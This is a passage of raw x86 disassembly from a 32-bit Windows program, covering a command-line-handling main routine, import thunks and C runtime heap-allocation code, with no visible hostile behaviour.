  403a45:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403a49:	8b 11                	mov    (%ecx),%edx
  403a4b:	52                   	push   %edx
  403a4c:	e8 8f fd ff ff       	call   0x4037e0
  403a51:	83 c4 04             	add    $0x4,%esp
  403a54:	5f                   	pop    %edi
  403a55:	5e                   	pop    %esi
  403a56:	5d                   	pop    %ebp
  403a57:	5b                   	pop    %ebx
  403a58:	83 c4 08             	add    $0x8,%esp
  403a5b:	c3                   	ret
  403a5c:	80 3d cd 61 42 00 00 	cmpb   $0x0,0x4261cd
  403a63:	74 1b                	je     0x403a80
  403a65:	84 c0                	test   %al,%al
  403a67:	75 17                	jne    0x403a80
  403a69:	8b 44 24 20          	mov    0x20(%esp),%eax
  403a6d:	8b 08                	mov    (%eax),%ecx
  403a6f:	51                   	push   %ecx
  403a70:	e8 6b fd ff ff       	call   0x4037e0
  403a75:	83 c4 04             	add    $0x4,%esp
  403a78:	5f                   	pop    %edi
  403a79:	5e                   	pop    %esi
  403a7a:	5d                   	pop    %ebp
  403a7b:	5b                   	pop    %ebx
  403a7c:	83 c4 08             	add    $0x8,%esp
  403a7f:	c3                   	ret
  403a80:	5f                   	pop    %edi
  403a81:	5e                   	pop    %esi
  403a82:	5d                   	pop    %ebp
  403a83:	8a c3                	mov    %bl,%al
  403a85:	5b                   	pop    %ebx
  403a86:	83 c4 08             	add    $0x8,%esp
  403a89:	c3                   	ret
  403a8a:	cc                   	int3
  403a8b:	cc                   	int3
  403a8c:	cc                   	int3
  403a8d:	cc                   	int3
  403a8e:	cc                   	int3
  403a8f:	cc                   	int3
  403a90:	81 ec 14 01 00 00    	sub    $0x114,%esp
  403a96:	a1 b8 50 42 00       	mov    0x4250b8,%eax
  403a9b:	33 c4                	xor    %esp,%eax
  403a9d:	89 84 24 10 01 00 00 	mov    %eax,0x110(%esp)
  403aa4:	57                   	push   %edi
  403aa5:	8b bc 24 20 01 00 00 	mov    0x120(%esp),%edi
  403aac:	8d 84 24 1c 01 00 00 	lea    0x11c(%esp),%eax
  403ab3:	57                   	push   %edi
  403ab4:	50                   	push   %eax
  403ab5:	e8 06 f8 ff ff       	call   0x4032c0
  403aba:	83 c4 08             	add    $0x8,%esp
  403abd:	ff 15 14 e1 41 00    	call   *0x41e114
  403ac3:	3d 00 00 00 80       	cmp    $0x80000000,%eax
  403ac8:	72 26                	jb     0x403af0
  403aca:	68 a8 10 42 00       	push   $0x4210a8
  403acf:	e8 12 25 00 00       	call   0x405fe6
  403ad4:	83 c4 04             	add    $0x4,%esp
  403ad7:	83 c8 ff             	or     $0xffffffff,%eax
  403ada:	5f                   	pop    %edi
  403adb:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  403ae2:	33 cc                	xor    %esp,%ecx
  403ae4:	e8 2d 09 00 00       	call   0x404416
  403ae9:	81 c4 14 01 00 00    	add    $0x114,%esp
  403aef:	c3                   	ret
  403af0:	ff 15 cc e0 41 00    	call   *0x41e0cc
  403af6:	8d 54 24 10          	lea    0x10(%esp),%edx
  403afa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403b00:	8a 08                	mov    (%eax),%cl
  403b02:	88 0a                	mov    %cl,(%edx)
  403b04:	40                   	inc    %eax
  403b05:	42                   	inc    %edx
  403b06:	84 c9                	test   %cl,%cl
  403b08:	75 f6                	jne    0x403b00
  403b0a:	80 7c 24 10 22       	cmpb   $0x22,0x10(%esp)
  403b0f:	56                   	push   %esi
  403b10:	8d 74 24 14          	lea    0x14(%esp),%esi
  403b14:	75 17                	jne    0x403b2d
  403b16:	8d 74 24 15          	lea    0x15(%esp),%esi
  403b1a:	8b c6                	mov    %esi,%eax
  403b1c:	8d 50 01             	lea    0x1(%eax),%edx
  403b1f:	90                   	nop
  403b20:	8a 08                	mov    (%eax),%cl
  403b22:	40                   	inc    %eax
  403b23:	84 c9                	test   %cl,%cl
  403b25:	75 f9                	jne    0x403b20
  403b27:	2b c2                	sub    %edx,%eax
  403b29:	88 4c 04 15          	mov    %cl,0x15(%esp,%eax,1)
  403b2d:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403b31:	51                   	push   %ecx
  403b32:	68 40 6d 42 00       	push   $0x426d40
  403b37:	68 04 01 00 00       	push   $0x104
  403b3c:	56                   	push   %esi
  403b3d:	ff 15 c8 e0 41 00    	call   *0x41e0c8
  403b43:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403b47:	85 c0                	test   %eax,%eax
  403b49:	74 03                	je     0x403b4e
  403b4b:	c6 00 00             	movb   $0x0,(%eax)
  403b4e:	8b 94 24 20 01 00 00 	mov    0x120(%esp),%edx
  403b55:	57                   	push   %edi
  403b56:	52                   	push   %edx
  403b57:	e8 d4 fc ff ff       	call   0x403830
  403b5c:	83 c4 08             	add    $0x8,%esp
  403b5f:	84 c0                	test   %al,%al
  403b61:	75 07                	jne    0x403b6a
  403b63:	6a ff                	push   $0xffffffff
  403b65:	e8 0a 2c 00 00       	call   0x406774
  403b6a:	80 3d cc 61 42 00 00 	cmpb   $0x0,0x4261cc
  403b71:	74 59                	je     0x403bcc
  403b73:	80 3d cd 61 42 00 00 	cmpb   $0x0,0x4261cd
  403b7a:	75 50                	jne    0x403bcc
  403b7c:	68 a4 0a 42 00       	push   $0x420aa4
  403b81:	e8 60 24 00 00       	call   0x405fe6
  403b86:	e8 aa 16 00 00       	call   0x405235
  403b8b:	83 c0 20             	add    $0x20,%eax
  403b8e:	50                   	push   %eax
  403b8f:	e8 f6 23 00 00       	call   0x405f8a
  403b94:	83 c4 08             	add    $0x8,%esp
  403b97:	33 f6                	xor    %esi,%esi
  403b99:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403ba0:	e8 a1 21 00 00       	call   0x405d46
  403ba5:	3c 0d                	cmp    $0xd,%al
  403ba7:	74 0f                	je     0x403bb8
  403ba9:	88 86 60 6e 42 00    	mov    %al,0x426e60(%esi)
  403baf:	46                   	inc    %esi
  403bb0:	81 fe 03 01 00 00    	cmp    $0x103,%esi
  403bb6:	72 e8                	jb     0x403ba0
  403bb8:	68 a0 0a 42 00       	push   $0x420aa0
  403bbd:	c6 86 60 6e 42 00 00 	movb   $0x0,0x426e60(%esi)
  403bc4:	e8 1d 24 00 00       	call   0x405fe6
  403bc9:	83 c4 04             	add    $0x4,%esp
  403bcc:	8d 44 24 10          	lea    0x10(%esp),%eax
  403bd0:	50                   	push   %eax
  403bd1:	68 80 6f 42 00       	push   $0x426f80
  403bd6:	c7 44 24 18 04 01 00 	movl   $0x104,0x18(%esp)
  403bdd:	00 
  403bde:	ff 15 a8 e0 41 00    	call   *0x41e0a8
  403be4:	80 3d c8 60 42 00 00 	cmpb   $0x0,0x4260c8
  403beb:	0f 84 81 00 00 00    	je     0x403c72
  403bf1:	68 80 6f 42 00       	push   $0x426f80
  403bf6:	68 c8 60 42 00       	push   $0x4260c8
  403bfb:	e8 29 36 00 00       	call   0x407229
  403c00:	83 c4 08             	add    $0x8,%esp
  403c03:	85 c0                	test   %eax,%eax
  403c05:	74 6b                	je     0x403c72
  403c07:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  403c0b:	51                   	push   %ecx
  403c0c:	e8 ef f8 ff ff       	call   0x403500
  403c11:	83 c4 04             	add    $0x4,%esp
  403c14:	85 c0                	test   %eax,%eax
  403c16:	0f 84 d8 00 00 00    	je     0x403cf4
  403c1c:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403c21:	68 c8 60 42 00       	push   $0x4260c8
  403c26:	85 c0                	test   %eax,%eax
  403c28:	74 2f                	je     0x403c59
  403c2a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403c2e:	50                   	push   %eax
  403c2f:	83 f9 01             	cmp    $0x1,%ecx
  403c32:	76 13                	jbe    0x403c47
  403c34:	51                   	push   %ecx
  403c35:	68 80 10 42 00       	push   $0x421080
  403c3a:	e8 a7 23 00 00       	call   0x405fe6
  403c3f:	83 c4 10             	add    $0x10,%esp
  403c42:	e9 41 01 00 00       	jmp    0x403d88
  403c47:	68 64 10 42 00       	push   $0x421064
  403c4c:	e8 95 23 00 00       	call   0x405fe6
  403c51:	83 c4 0c             	add    $0xc,%esp
  403c54:	e9 2f 01 00 00       	jmp    0x403d88
  403c59:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403c5f:	52                   	push   %edx
  403c60:	68 48 10 42 00       	push   $0x421048
  403c65:	e8 7c 23 00 00       	call   0x405fe6
  403c6a:	83 c4 0c             	add    $0xc,%esp
  403c6d:	e9 16 01 00 00       	jmp    0x403d88
  403c72:	0f b6 0d ce 61 42 00 	movzbl 0x4261ce,%ecx
  403c79:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403c7f:	8d 44 24 08          	lea    0x8(%esp),%eax
  403c83:	50                   	push   %eax
  403c84:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403c89:	51                   	push   %ecx
  403c8a:	52                   	push   %edx
  403c8b:	50                   	push   %eax
  403c8c:	e8 af d4 ff ff       	call   0x401140
  403c91:	8b f0                	mov    %eax,%esi
  403c93:	83 c4 10             	add    $0x10,%esp
  403c96:	85 f6                	test   %esi,%esi
  403c98:	74 74                	je     0x403d0e
  403c9a:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403c9f:	85 c0                	test   %eax,%eax
  403ca1:	74 08                	je     0x403cab
  403ca3:	50                   	push   %eax
  403ca4:	68 2c 10 42 00       	push   $0x42102c
  403ca9:	eb 0c                	jmp    0x403cb7
  403cab:	8b 0d 44 6e 42 00    	mov    0x426e44,%ecx
  403cb1:	51                   	push   %ecx
  403cb2:	68 10 10 42 00       	push   $0x421010
  403cb7:	e8 2a 23 00 00       	call   0x405fe6
  403cbc:	83 c4 08             	add    $0x8,%esp
  403cbf:	83 fe 57             	cmp    $0x57,%esi
  403cc2:	75 27                	jne    0x403ceb
  403cc4:	68 f4 0f 42 00       	push   $0x420ff4
  403cc9:	e8 18 23 00 00       	call   0x405fe6
  403cce:	83 c4 04             	add    $0x4,%esp
  403cd1:	5e                   	pop    %esi
  403cd2:	83 c8 ff             	or     $0xffffffff,%eax
  403cd5:	5f                   	pop    %edi
  403cd6:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  403cdd:	33 cc                	xor    %esp,%ecx
  403cdf:	e8 32 07 00 00       	call   0x404416
  403ce4:	81 c4 14 01 00 00    	add    $0x114,%esp
  403cea:	c3                   	ret
  403ceb:	56                   	push   %esi
  403cec:	e8 3f e5 ff ff       	call   0x402230
  403cf1:	83 c4 04             	add    $0x4,%esp
  403cf4:	5e                   	pop    %esi
  403cf5:	83 c8 ff             	or     $0xffffffff,%eax
  403cf8:	5f                   	pop    %edi
  403cf9:	8b 8c 24 10 01 00 00 	mov    0x110(%esp),%ecx
  403d00:	33 cc                	xor    %esp,%ecx
  403d02:	e8 0f 07 00 00       	call   0x404416
  403d07:	81 c4 14 01 00 00    	add    $0x114,%esp
  403d0d:	c3                   	ret
  403d0e:	8b 44 24 08          	mov    0x8(%esp),%eax
  403d12:	83 f8 01             	cmp    $0x1,%eax
  403d15:	76 4c                	jbe    0x403d63
  403d17:	80 3d ce 61 42 00 00 	cmpb   $0x0,0x4261ce
  403d1e:	8b 0d d4 62 42 00    	mov    0x4262d4,%ecx
  403d24:	74 2c                	je     0x403d52
  403d26:	85 c9                	test   %ecx,%ecx
  403d28:	74 11                	je     0x403d3b
  403d2a:	51                   	push   %ecx
  403d2b:	50                   	push   %eax
  403d2c:	68 bc 0f 42 00       	push   $0x420fbc
  403d31:	e8 b0 22 00 00       	call   0x405fe6
  403d36:	83 c4 0c             	add    $0xc,%esp
  403d39:	eb 4d                	jmp    0x403d88
  403d3b:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403d41:	52                   	push   %edx
  403d42:	50                   	push   %eax
  403d43:	68 84 0f 42 00       	push   $0x420f84
  403d48:	e8 99 22 00 00       	call   0x405fe6
  403d4d:	83 c4 0c             	add    $0xc,%esp
  403d50:	eb 36                	jmp    0x403d88
  403d52:	51                   	push   %ecx
  403d53:	50                   	push   %eax
  403d54:	68 64 0f 42 00       	push   $0x420f64
  403d59:	e8 88 22 00 00       	call   0x405fe6
  403d5e:	83 c4 0c             	add    $0xc,%esp
  403d61:	eb 25                	jmp    0x403d88
  403d63:	a1 d4 62 42 00       	mov    0x4262d4,%eax
  403d68:	85 c0                	test   %eax,%eax
  403d6a:	74 08                	je     0x403d74
  403d6c:	50                   	push   %eax
  403d6d:	68 4c 0f 42 00       	push   $0x420f4c
  403d72:	eb 0c                	jmp    0x403d80
  403d74:	8b 15 44 6e 42 00    	mov    0x426e44,%edx
  403d7a:	52                   	push   %edx
  403d7b:	68 34 0f 42 00       	push   $0x420f34
  403d80:	e8 61 22 00 00       	call   0x405fe6
  403d85:	83 c4 08             	add    $0x8,%esp
  403d88:	8b 8c 24 18 01 00 00 	mov    0x118(%esp),%ecx
  403d8f:	5e                   	pop    %esi
  403d90:	5f                   	pop    %edi
  403d91:	33 cc                	xor    %esp,%ecx
  403d93:	33 c0                	xor    %eax,%eax
  403d95:	e8 7c 06 00 00       	call   0x404416
  403d9a:	81 c4 14 01 00 00    	add    $0x114,%esp
  403da0:	c3                   	ret
  403da1:	cc                   	int3
  403da2:	ff 25 80 e2 41 00    	jmp    *0x41e280
  403da8:	ff 25 78 e2 41 00    	jmp    *0x41e278
  403dae:	ff 25 7c e2 41 00    	jmp    *0x41e27c
  403db4:	ff 25 44 e2 41 00    	jmp    *0x41e244
  403dba:	ff 25 48 e2 41 00    	jmp    *0x41e248
  403dc0:	ff 25 90 e2 41 00    	jmp    *0x41e290
  403dc6:	ff 25 94 e2 41 00    	jmp    *0x41e294
  403dcc:	ff 25 8c e2 41 00    	jmp    *0x41e28c
  403dd2:	ff 25 88 e2 41 00    	jmp    *0x41e288
  403dd8:	ff 25 3c e2 41 00    	jmp    *0x41e23c
  403dde:	ff 25 38 e2 41 00    	jmp    *0x41e238
  403de4:	ff 25 28 e1 41 00    	jmp    *0x41e128
  403dea:	ff 25 24 e1 41 00    	jmp    *0x41e124
  403df0:	ff 25 20 e1 41 00    	jmp    *0x41e120
  403df6:	ff 25 1c e1 41 00    	jmp    *0x41e11c
  403dfc:	ff 25 b8 e0 41 00    	jmp    *0x41e0b8
  403e02:	ff 25 18 e1 41 00    	jmp    *0x41e118
  403e08:	ff 25 0c e1 41 00    	jmp    *0x41e10c
  403e0e:	ff 25 10 e1 41 00    	jmp    *0x41e110
  403e14:	ff 25 08 e1 41 00    	jmp    *0x41e108
  403e1a:	ff 25 04 e1 41 00    	jmp    *0x41e104
  403e20:	ff 25 00 e1 41 00    	jmp    *0x41e100
  403e26:	ff 25 fc e0 41 00    	jmp    *0x41e0fc
  403e2c:	ff 25 f8 e0 41 00    	jmp    *0x41e0f8
  403e32:	ff 25 b4 e0 41 00    	jmp    *0x41e0b4
  403e38:	ff 25 74 e0 41 00    	jmp    *0x41e074
  403e3e:	ff 25 78 e0 41 00    	jmp    *0x41e078
  403e44:	ff 25 7c e0 41 00    	jmp    *0x41e07c
  403e4a:	ff 25 80 e0 41 00    	jmp    *0x41e080
  403e50:	ff 25 84 e0 41 00    	jmp    *0x41e084
  403e56:	ff 25 88 e0 41 00    	jmp    *0x41e088
  403e5c:	ff 25 8c e0 41 00    	jmp    *0x41e08c
  403e62:	ff 25 90 e0 41 00    	jmp    *0x41e090
  403e68:	ff 25 94 e0 41 00    	jmp    *0x41e094
  403e6e:	ff 25 98 e0 41 00    	jmp    *0x41e098
  403e74:	ff 25 9c e0 41 00    	jmp    *0x41e09c
  403e7a:	ff 25 a0 e0 41 00    	jmp    *0x41e0a0
  403e80:	ff 25 a4 e0 41 00    	jmp    *0x41e0a4
  403e86:	ff 25 a8 e0 41 00    	jmp    *0x41e0a8
  403e8c:	ff 25 ac e0 41 00    	jmp    *0x41e0ac
  403e92:	ff 25 b0 e0 41 00    	jmp    *0x41e0b0
  403e98:	ff 25 14 e1 41 00    	jmp    *0x41e114
  403e9e:	ff 25 68 e1 41 00    	jmp    *0x41e168
  403ea4:	ff 25 bc e0 41 00    	jmp    *0x41e0bc
  403eaa:	ff 25 c0 e0 41 00    	jmp    *0x41e0c0
  403eb0:	ff 25 c4 e0 41 00    	jmp    *0x41e0c4
  403eb6:	ff 25 c8 e0 41 00    	jmp    *0x41e0c8
  403ebc:	ff 25 cc e0 41 00    	jmp    *0x41e0cc
  403ec2:	ff 25 5c e2 41 00    	jmp    *0x41e25c
  403ec8:	ff 25 70 e2 41 00    	jmp    *0x41e270
  403ece:	ff 25 54 e2 41 00    	jmp    *0x41e254
  403ed4:	ff 25 50 e2 41 00    	jmp    *0x41e250
  403eda:	ff 25 58 e2 41 00    	jmp    *0x41e258
  403ee0:	ff 25 60 e2 41 00    	jmp    *0x41e260
  403ee6:	ff 25 64 e2 41 00    	jmp    *0x41e264
  403eec:	ff 25 68 e2 41 00    	jmp    *0x41e268
  403ef2:	ff 25 6c e2 41 00    	jmp    *0x41e26c
  403ef8:	ff 25 68 e0 41 00    	jmp    *0x41e068
  403efe:	ff 25 64 e0 41 00    	jmp    *0x41e064
  403f04:	ff 25 60 e0 41 00    	jmp    *0x41e060
  403f0a:	ff 25 5c e0 41 00    	jmp    *0x41e05c
  403f10:	ff 25 58 e0 41 00    	jmp    *0x41e058
  403f16:	ff 25 6c e0 41 00    	jmp    *0x41e06c
  403f1c:	ff 25 50 e0 41 00    	jmp    *0x41e050
  403f22:	ff 25 48 e0 41 00    	jmp    *0x41e048
  403f28:	ff 25 44 e0 41 00    	jmp    *0x41e044
  403f2e:	ff 25 40 e0 41 00    	jmp    *0x41e040
  403f34:	ff 25 3c e0 41 00    	jmp    *0x41e03c
  403f3a:	ff 25 38 e0 41 00    	jmp    *0x41e038
  403f40:	ff 25 34 e0 41 00    	jmp    *0x41e034
  403f46:	ff 25 30 e0 41 00    	jmp    *0x41e030
  403f4c:	ff 25 2c e0 41 00    	jmp    *0x41e02c
  403f52:	ff 25 28 e0 41 00    	jmp    *0x41e028
  403f58:	ff 25 24 e0 41 00    	jmp    *0x41e024
  403f5e:	ff 25 20 e0 41 00    	jmp    *0x41e020
  403f64:	ff 25 00 e0 41 00    	jmp    *0x41e000
  403f6a:	ff 25 1c e0 41 00    	jmp    *0x41e01c
  403f70:	ff 25 18 e0 41 00    	jmp    *0x41e018
  403f76:	ff 25 14 e0 41 00    	jmp    *0x41e014
  403f7c:	ff 25 10 e0 41 00    	jmp    *0x41e010
  403f82:	ff 25 0c e0 41 00    	jmp    *0x41e00c
  403f88:	ff 25 08 e0 41 00    	jmp    *0x41e008
  403f8e:	ff 25 04 e0 41 00    	jmp    *0x41e004
  403f94:	6a 0c                	push   $0xc
  403f96:	68 20 30 42 00       	push   $0x423020
  403f9b:	e8 68 48 00 00       	call   0x408808
  403fa0:	8b 75 08             	mov    0x8(%ebp),%esi
  403fa3:	85 f6                	test   %esi,%esi
  403fa5:	74 75                	je     0x40401c
  403fa7:	83 3d c8 71 42 00 03 	cmpl   $0x3,0x4271c8
  403fae:	75 43                	jne    0x403ff3
  403fb0:	6a 04                	push   $0x4
  403fb2:	e8 fd 37 00 00       	call   0x4077b4
  403fb7:	59                   	pop    %ecx
  403fb8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403fbc:	56                   	push   %esi
  403fbd:	e8 20 39 00 00       	call   0x4078e2
  403fc2:	59                   	pop    %ecx
  403fc3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403fc6:	85 c0                	test   %eax,%eax
  403fc8:	74 09                	je     0x403fd3
  403fca:	56                   	push   %esi
  403fcb:	50                   	push   %eax
  403fcc:	e8 41 39 00 00       	call   0x407912
  403fd1:	59                   	pop    %ecx
  403fd2:	59                   	pop    %ecx
  403fd3:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403fda:	e8 0b 00 00 00       	call   0x403fea
  403fdf:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  403fe3:	75 37                	jne    0x40401c
  403fe5:	ff 75 08             	push   0x8(%ebp)
  403fe8:	eb 0a                	jmp    0x403ff4
  403fea:	6a 04                	push   $0x4
  403fec:	e8 d1 36 00 00       	call   0x4076c2
  403ff1:	59                   	pop    %ecx
  403ff2:	c3                   	ret
  403ff3:	56                   	push   %esi
  403ff4:	6a 00                	push   $0x0
  403ff6:	ff 35 20 63 42 00    	push   0x426320
  403ffc:	ff 15 6c e1 41 00    	call   *0x41e16c
  404002:	85 c0                	test   %eax,%eax
  404004:	75 16                	jne    0x40401c
  404006:	e8 7e 34 00 00       	call   0x407489
  40400b:	8b f0                	mov    %eax,%esi
  40400d:	ff 15 18 e1 41 00    	call   *0x41e118
  404013:	50                   	push   %eax
  404014:	e8 2e 34 00 00       	call   0x407447
  404019:	89 06                	mov    %eax,(%esi)
  40401b:	59                   	pop    %ecx
  40401c:	e8 2c 48 00 00       	call   0x40884d
  404021:	c3                   	ret
  404022:	6a 0c                	push   $0xc
  404024:	68 40 30 42 00       	push   $0x423040
  404029:	e8 da 47 00 00       	call   0x408808
  40402e:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  404032:	8b 75 08             	mov    0x8(%ebp),%esi
  404035:	3b 35 b8 71 42 00    	cmp    0x4271b8,%esi
  40403b:	77 22                	ja     0x40405f
  40403d:	6a 04                	push   $0x4
  40403f:	e8 70 37 00 00       	call   0x4077b4
  404044:	59                   	pop    %ecx
  404045:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404049:	56                   	push   %esi
  40404a:	e8 d2 44 00 00       	call   0x408521
  40404f:	59                   	pop    %ecx
  404050:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404053:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40405a:	e8 09 00 00 00       	call   0x404068
  40405f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404062:	e8 e6 47 00 00       	call   0x40884d
  404067:	c3                   	ret
  404068:	6a 04                	push   $0x4
  40406a:	e8 53 36 00 00       	call   0x4076c2
  40406f:	59                   	pop    %ecx
  404070:	c3                   	ret
  404071:	8b ff                	mov    %edi,%edi
  404073:	55                   	push   %ebp
  404074:	8b ec                	mov    %esp,%ebp
  404076:	83 3d 20 63 42 00 00 	cmpl   $0x0,0x426320
  40407d:	75 18                	jne    0x404097
  40407f:	e8 ae 49 00 00       	call   0x408a32
  404084:	6a 1e                	push   $0x1e
  404086:	e8 d6 47 00 00       	call   0x408861
  40408b:	68 ff 00 00 00       	push   $0xff
  404090:	e8 4b 24 00 00       	call   0x4064e0
  404095:	59                   	pop    %ecx
  404096:	59                   	pop    %ecx
  404097:	a1 c8 71 42 00       	mov    0x4271c8,%eax
  40409c:	83 f8 01             	cmp    $0x1,%eax
  40409f:	75 19                	jne    0x4040ba
  4040a1:	8b 45 08             	mov    0x8(%ebp),%eax
  4040a4:	85 c0                	test   %eax,%eax
  4040a6:	75 01                	jne    0x4040a9
  4040a8:	40                   	inc    %eax
  4040a9:	50                   	push   %eax
  4040aa:	6a 00                	push   $0x0
  4040ac:	ff 35 20 63 42 00    	push   0x426320
  4040b2:	ff 15 70 e1 41 00    	call   *0x41e170
  4040b8:	5d                   	pop    %ebp
  4040b9:	c3                   	ret
  4040ba:	56                   	push   %esi
  4040bb:	8b 75 08             	mov    0x8(%ebp),%esi
  4040be:	83 f8 03             	cmp    $0x3,%eax
  4040c1:	75 0b                	jne    0x4040ce
  4040c3:	56                   	push   %esi
  4040c4:	e8 59 ff ff ff       	call   0x404022
  4040c9:	59                   	pop    %ecx
  4040ca:	85 c0                	test   %eax,%eax
  4040cc:	75 1a                	jne    0x4040e8
  4040ce:	85 f6                	test   %esi,%esi
  4040d0:	75 01                	jne    0x4040d3
  4040d2:	46                   	inc    %esi
  4040d3:	83 c6 0f             	add    $0xf,%esi
  4040d6:	83 e6 f0             	and    $0xfffffff0,%esi
  4040d9:	56                   	push   %esi
  4040da:	6a 00                	push   $0x0
  4040dc:	ff 35 20 63 42 00    	push   0x426320
  4040e2:	ff 15 70 e1 41 00    	call   *0x41e170
  4040e8:	5e                   	pop    %esi
  4040e9:	5d                   	pop    %ebp
  4040ea:	c3                   	ret
  4040eb:	8b ff                	mov    %edi,%edi
  4040ed:	55                   	push   %ebp
  4040ee:	8b ec                	mov    %esp,%ebp
  4040f0:	56                   	push   %esi
  4040f1:	8b 75 08             	mov    0x8(%ebp),%esi
  4040f4:	83 fe e0             	cmp    $0xffffffe0,%esi
  4040f7:	0f 87 a1 00 00 00    	ja     0x40419e
  4040fd:	53                   	push   %ebx
  4040fe:	57                   	push   %edi
  4040ff:	8b 3d 70 e1 41 00    	mov    0x41e170,%edi
  404105:	83 3d 20 63 42 00 00 	cmpl   $0x0,0x426320
  40410c:	75 18                	jne    0x404126
  40410e:	e8 1f 49 00 00       	call   0x408a32
  404113:	6a 1e                	push   $0x1e
  404115:	e8 47 47 00 00       	call   0x408861
  40411a:	68 ff 00 00 00       	push   $0xff
  40411f:	e8 bc 23 00 00       	call   0x4064e0
  404124:	59                   	pop    %ecx
  404125:	59                   	pop    %ecx
  404126:	a1 c8 71 42 00       	mov    0x4271c8,%eax
  40412b:	83 f8 01             	cmp    $0x1,%eax
  40412e:	75 0e                	jne    0x40413e
  404130:	85 f6                	test   %esi,%esi
  404132:	74 04                	je     0x404138
  404134:	8b c6                	mov    %esi,%eax
  404136:	eb 03                	jmp    0x40413b
  404138:	33 c0                	xor    %eax,%eax
  40413a:	40                   	inc    %eax
  40413b:	50                   	push   %eax
  40413c:	eb 1c                	jmp    0x40415a
  40413e:	83 f8 03             	cmp    $0x3,%eax
  404141:	75 0b                	jne    0x40414e
  404143:	56                   	push   %esi
  404144:	e8 d9 fe ff ff       	call   0x404022
  404149:	59                   	pop    %ecx
  40414a:	85 c0                	test   %eax,%eax
  40414c:	75 16                	jne    0x404164
  40414e:	85 f6                	test   %esi,%esi
  404150:	75 01                	jne    0x404153
  404152:	46                   	inc    %esi
  404153:	83 c6 0f             	add    $0xf,%esi
  404156:	83 e6 f0             	and    $0xfffffff0,%esi
  404159:	56                   	push   %esi
  40415a:	6a 00                	push   $0x0
  40415c:	ff 35 20 63 42 00    	push   0x426320
  404162:	ff d7                	call   *%edi
  404164:	8b d8                	mov    %eax,%ebx
  404166:	85 db                	test   %ebx,%ebx
  404168:	75 2e                	jne    0x404198
  40416a:	6a 0c                	push   $0xc
  40416c:	5e                   	pop    %esi
  40416d:	39 05 98 67 42 00    	cmp    %eax,0x426798
  404173:	74 15                	je     0x40418a
  404175:	ff 75 08             	push   0x8(%ebp)
  404178:	e8 49 49 00 00       	call   0x408ac6
  40417d:	59                   	pop    %ecx
  40417e:	85 c0                	test   %eax,%eax
  404180:	74 0f                	je     0x404191
  404182:	8b 75 08             	mov    0x8(%ebp),%esi
  404185:	e9 7b ff ff ff       	jmp    0x404105
  40418a:	e8 fa 32 00 00       	call   0x407489
  40418f:	89 30                	mov    %esi,(%eax)
  404191:	e8 f3 32 00 00       	call   0x407489
  404196:	89 30                	mov    %esi,(%eax)
  404198:	5f                   	pop    %edi
  404199:	8b c3                	mov    %ebx,%eax
  40419b:	5b                   	pop    %ebx
  40419c:	eb 14                	jmp    0x4041b2
  40419e:	56                   	push   %esi
  40419f:	e8 22 49 00 00       	call   0x408ac6
  4041a4:	59                   	pop    %ecx
  4041a5:	e8 df 32 00 00       	call   0x407489
  4041aa:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4041b0:	33 c0                	xor    %eax,%eax
  4041b2:	5e                   	pop    %esi
  4041b3:	5d                   	pop    %ebp
  4041b4:	c3                   	ret
  4041b5:	8b ff                	mov    %edi,%edi
  4041b7:	55                   	push   %ebp
  4041b8:	8b ec                	mov    %esp,%ebp
  4041ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4041bd:	56                   	push   %esi
  4041be:	8b f1                	mov    %ecx,%esi
  4041c0:	c6 46 0c 00          	movb   $0x0,0xc(%esi)
  4041c4:	85 c0                	test   %eax,%eax
  4041c6:	75 63                	jne    0x40422b
  4041c8:	e8 09 66 00 00       	call   0x40a7d6
  4041cd:	89 46 08             	mov    %eax,0x8(%esi)
  4041d0:	8b 48 6c             	mov    0x6c(%eax),%ecx
  4041d3:	89 0e                	mov    %ecx,(%esi)
  4041d5:	8b 48 68             	mov    0x68(%eax),%ecx
  4041d8:	89 4e 04             	mov    %ecx,0x4(%esi)
  4041db:	8b 0e                	mov    (%esi),%ecx
  4041dd:	3b 0d a8 5c 42 00    	cmp    0x425ca8,%ecx
  4041e3:	74 12                	je     0x4041f7
  4041e5:	8b 0d c4 5b 42 00    	mov    0x425bc4,%ecx
  4041eb:	85 48 70             	test   %ecx,0x70(%eax)
  4041ee:	75 07                	jne    0x4041f7
  4041f0:	e8 fb 52 00 00       	call   0x4094f0
  4041f5:	89 06                	mov    %eax,(%esi)
  4041f7:	8b 46 04             	mov    0x4(%esi),%eax
  4041fa:	3b 05 c8 5a 42 00    	cmp    0x425ac8,%eax
  404200:	74 16                	je     0x404218
  404202:	8b 46 08             	mov    0x8(%esi),%eax
  404205:	8b 0d c4 5b 42 00    	mov    0x425bc4,%ecx
  40420b:	85 48 70             	test   %ecx,0x70(%eax)
  40420e:	75 08                	jne    0x404218
  404210:	e8 ff 4a 00 00       	call   0x408d14
  404215:	89 46 04             	mov    %eax,0x4(%esi)
  404218:	8b 46 08             	mov    0x8(%esi),%eax
  40421b:	f6 40 70 02          	testb  $0x2,0x70(%eax)
  40421f:	75 14                	jne    0x404235
  404221:	83 48 70 02          	orl    $0x2,0x70(%eax)
